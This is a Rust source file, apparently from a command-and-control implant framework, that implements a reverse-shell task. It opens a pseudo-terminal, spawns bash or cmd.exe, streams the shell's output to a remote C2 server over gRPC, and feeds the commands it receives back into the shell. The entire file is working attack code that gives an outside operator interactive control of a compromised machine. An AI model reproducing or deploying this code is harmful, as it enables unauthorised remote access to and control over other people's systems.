use super::Dispatcher;
use anyhow::Result;
use pb::c2::{ReverseShellRequest, ReverseShellResponse};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::sync::mpsc::channel;
use transport::Transport;

const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)

/*
 * ReverseShellMessage will open a reverse shell when dispatched.
 */
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ReverseShellMessage {
    pub(crate) id: i64,
    // pub(crate) name: String,
    // pub(crate) tx: Sender<FetchAssetResponse>,
}

impl Dispatcher for ReverseShellMessage {
    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
        #[cfg(debug_assertions)]
        log::info!("starting reverse shell");

        // let (input_tx, mut input_rx) = tokio::sync::mpsc::channel::<ReverseShellResponse>(1024);
        // let (output_tx, output_rx) = tokio::sync::mpsc::channel(1024);
        let task_id = self.id;

        // Queue an initial message
        // output_tx
        //     .send(ReverseShellRequest {
        //         task_id,
        //         data: b"Welcome!\n".to_vec(),
        //     })
        //     .await?;

        // Use the native pty implementation for the system
        let pty_system = native_pty_system();

        // Create a new pty
        let pair = pty_system.openpty(PtySize {
            rows: 24,
            cols: 80,
            // TODO: What it do?
            pixel_width: 0,
            pixel_height: 0,
        })?;

        // Spawn a shell into the pty
        #[cfg(not(target = "windows"))]
        let cmd = CommandBuilder::new("bash");
        #[cfg(target = "windows")]
        let cmd = CommandBuilder::new("cmd.exe");

        let _child = pair.slave.spawn_command(cmd)?;

        let mut reader = pair.master.try_clone_reader()?;
        let mut writer = pair.master.take_writer()?;

        let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);

        const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
        tokio::spawn(async move {
            loop {
                let mut buffer = [0; CHUNK_SIZE];
                let n = match reader.read(&mut buffer[..]) {
                    Ok(n) => n,
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to read tty: {}", _err);

                        break;
                    }
                };

                match output_tx
                    .send(ReverseShellRequest {
                        task_id,
                        data: buffer[..n].to_vec(),
                    })
                    .await
                {
                    Ok(_) => {
                        #[cfg(debug_assertions)]
                        log::info!(
                            "queued tty output: {}",
                            String::from_utf8_lossy(&buffer[..n])
                        );
                    }
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::info!("failed to queue tty output: {}", _err);
                    }
                }
            }
        });

        let req_stream = tokio_stream::wrappers::ReceiverStream::new(output_rx);
        let mut stream = transport.reverse_shell(req_stream).await?.into_inner();
        while let Some(msg) = stream.message().await? {
            match writer.write_all(&msg.data) {
                Ok(_) => {
                    #[cfg(debug_assertions)]
                    log::info!("wrote reverse_shell input to tty");
                }
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to write to reverse_shell input: {}", _err);
                }
            };
        }

        #[cfg(debug_assertions)]
        log::info!("stopped reverse shell gRPC stream");

        // read_handle.await?;
        // write_handle.await?;

        #[cfg(debug_assertions)]
        log::info!("closed reverse shell");

        Ok(())
    }
}

#[cfg(debug_assertions)]
impl PartialEq for ReverseShellMessage {
    fn eq(&self, other: &Self) -> bool {
        self.id == other.id
    }
}
